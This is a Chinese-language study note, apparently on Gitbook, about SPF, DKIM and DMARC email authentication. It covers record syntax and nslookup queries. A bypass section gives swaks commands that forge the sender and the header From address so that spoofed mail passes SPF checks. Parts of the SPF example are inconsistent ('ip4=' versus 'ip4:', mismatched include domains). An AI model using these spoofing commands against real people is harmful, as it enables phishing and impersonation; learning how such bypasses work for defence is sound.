地址认证电子邮件发件人身份的技术，是非常高效的垃圾邮件解决方案。 接收邮件方会首先检查域名的 SPF 记录，来确定发件人的 IP 地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。 借助 SPF 防范仿冒邮件和垃圾邮件 什么是 DNS SPF 记录？ SPF 记录是什么以及它如何工作：SPF 记录全解释 SPF 记录是什么样的？ 官方 SPF 记录文档 SPF 记录必须遵循一定的标准，以便服务器理解其内容。如下是 SPF 记录核心组成部分的示例： v=spf1 ip4=192.0.2.0 ip4=192.0.2.1 include:examplesender.email -all 这个例子让服务器知道这是什么类型的记录，声明对这个域被批准的 IP 地址和第三方，并告知服务器如何处理不符合要求的电子邮件。我们分别说明各组成部分是如何实现这一点的： v=spf1 告诉服务器这里包含一条 SPF 记录。每一条 SPF 记录都必须以这个字符串开始。 然后是 SPF 记录的“客人名单”部分，即授权 IP 地址。在本例中，SPF 记录告诉服务器，ip4=192.0.2.0 和 ip4=192.0.2.1 被授权代表该域发送电子邮件。 include:examplesender.net 是 “include”（包含）标记的示例，该标记告诉服务器，有哪些第三方组织被授权代表该域发送电子邮件。这个标记表示，被包含域（examplesender.net）的 SPF 记录内容应被检查，其中包含的 IP 地址也应被视为已授权。一条 SPF 记录中可包含多个域，但这个标记仅适用于有效的域。 Finally, -all 告诉服务器，SPF 记录中未列出的地址没有被授权发送电子邮件并应被拒绝。 这里的其他可选项包括 ~all：表示未列出的电子邮件将被标记为不安全邮件或垃圾邮件，但仍会被接受；不那么常见的是 +all：表示任何服务器都可以代表该域发送电子邮件。 SPF Record evaluation 邮件服务器中的 SPF 模块在对 SPF 记录中的 terms 进行估值后，向邮件服务器返回认证 (authentication) 结果。 SPF 中有 2 种 terms：mechanisms 以及 modifiers。 SPF 认证结果为以下其中之一： None: 未能有效地解释域名，或者域名上未找到 SPF 记录； Neutral: 发起请求的主机的 IP 地址是否允许并未确定； Pass: 发起请求的主机的 IP 地址被允许； Fail: 发起请求的主机的 IP 地址不被允许； Softfail: 发起请求的主机的 IP 地址可能不被允许； Temperror: SPF 模块在检查时碰到临时网络错误； Permerror: 域名上发布的 SPF 无法解释。这种情况，域名管理员须修复此错误。 如果一直到 SPF 记录的末尾都没有找到匹配，返回 neutral。这是 SPF 估值的缺省值。 SPF qualifiers SPF qualifier 前置于 SPF mechanism，用来指定该 SPF mechanism 的估值结果。以下是所有的 qualifiers，以及对应的结果： \"+\" pass \"-\" fail \"~\" softfail \"?\" neutral SPF mechanisms 有两种 SPF mechanisms：基本 mechanisms 和指定发送者 mechanisms。 基本 mechanisms 有 all 和 include。 指定发送者 mechanisms 有 a，mx，ptr，ip4，ip6，和 exists。 include 可以让 SPF 记录把定义在另外一个 SPF 记录中的第三方 IP 地址包括进来。 要确保 SPF 记录有效，需要注意如下几点： 每个域不能关联多条 SPF 记录。 记录必须以 all 部分结束，或包含一个 redirect: 部分（表示该 SPF 记录由另一个域托管）。 SPF 记录不能包含大写字母。 SPF modifiers SPF 有两个 modifiers：redirect 和 exp。 SPF modifiers 是可选的。 每条 SPF record 中的任何 SPF modifier 只能够使用一次。 未知的 modifiers 会被忽略。 redirect=：在 domain 上面的 SPF 记录会代替当前的 SPF 记录。 exp=：如果 SPF 记录估值失败，并且存在 exp modifier，SPF 返回一个串来解释原因。 EXAMPLE 如： 如果 mail.smtp2go.com 是我的邮件服务器，那么 gmail 服务器收到的源 IP 也肯定是 mail.smtp2go.com 的 IP。 gmail 会校验邮件发送者的 IP 是否存在于 smtp.from 的域名 spf 配置列表里。 使用 Swaks swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap smtp.from 就是 admin@qq.com，和 mail.smtp2go.com 的 IP 肯定不同，所以 SPF 校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。 默认情况下，如果未设置 Mail.From 也就是邮件头的 From，则会使用 smtp.from 作为 Mail.From。 What is a DNS TXT record? DNS“文本”(TXT) 记录允许域管理员将文本输入到域名系统 (DNS) 中。TXT 记录最初的目的是用作存放人类可读笔记的地方。但是，现在也可以将一些机器可读的数据放入 TXT 记录中。 一个域可以有许多 TXT 记录。 https://www.cloudflare.com/zh-cn/learning/dns/dns-records/dns-txt-record/ TXT 记录示例： example.com record type value TTL @ TXT This is an awesome domain!Definitely not spammy. 32600 如今，DNS TXT 记录的两个最重要用途是防止垃圾邮件和域名所有权验证，尽管 TXT 记录最初并非为这些用途而设计。 查询 SPF # nslookup -q=txt 域名 # nslookup -type=txt 域名，如 huawei 的 PS C:\\Users\\Zzzz> nslookup -type=txt huawei.com 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: huawei.com text = \"MS=C4F6A693225CC6E058F6C9C39FD728C06C43E597\" huawei.com text = \"N3U/UqKcdI+8rthQEYTbph+m6MCg7+IW43PP5SuPxww=\" huawei.com text = \"v=spf1 ip4:45.249.212.32 ip4:45.249.212.35 ip4:45.249.212.255 ip4:45.249.212.187/29 ip4:45.249.212.191 ip4:168.195.93.47 ip4:185.176.79.56 ip4:119.8.179.247 ip4:119.8.89.136/31 ip4:119.8.89.135 ip4:119.8.177.36/31 ip4:119.8.177.38 -all\" huawei.com text = \"v=DMARC1;p=none;rua=mailto:dmarc@edm.huawei.com\" # 没有 SPF PS C:\\Users\\Zor0> nslookup 默认服务器: UnKnown Address: 192.168.170.16 > set q=txt > 5000.cn 服务器: UnKnown Address: 192.168.170.16 5000.cn primary name server = ns3.dns.com responsible mail addr = admin.dns.com serial = 1546510465 refresh = 7200 (2 hours) retry = 3600 (1 hour) expire = 1209600 (14 days) default TTL = 1800 (30 mins) > SPF 的绕过 我们只需要让 smtp.from 域名中配置的 txt 记录和发信 IP 一直那么就可以通过 SPF 校验。又或者有的域名没有配置 SPF 那么也可以进行伪造。 由于邮件显示的是 Header 中的 From 不是 smtp.from，因此可以将 smtp.from 设置为正常的邮件服务器地址，伪造一个 Mail.From 即可。 swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: '管理员' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap Gmail 接收到这封邮件后，会校验 --from xx@smtp2go.com 中的 smtp2go.com 是否等于 mail.smtp2go.com 的 IP，由于是相等的，所以完成了 SPF 的校验。 而 DKIM 是校验邮件完整性的，smtp2go 与 Gmail 直接使用的是 TLS，不会发生什么问题。 DKIM 与 DMARC 域名密钥识别邮件（DomainKeys Identified Mail，DKIM）是一套电子邮件认证机制，使用公开密钥加密邮件，以检测邮件是否是伪造或被篡改。【完整性校验】 通常发送方会在电子邮件的标头插入 DKIM-Signature 及电子签名, 而接收方则透过 DNS 查询得到公钥后进行验证。 DMARC 建立在发件人策略框架 (SPF)和域名识别邮件 (DKIM)协议之上。如果这两种身份验证方法都不通过，DMARC 策略将决定如何处理该消息。DMARC 要求域名所有者在 DNS 记录中设置 SPF 记录和 DKIM 记录，并明确声明对验证失败邮件的处理策略。 以上两种机制也是现有的电子邮件安全机制，不过以 SPF 策略为主。 0x00 前人栽树 https://payloads.online/archivers/2019-05-09/1/ https://saucer-man.com/information_security/452.html#cl-4 Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-25 23:22:57 "}}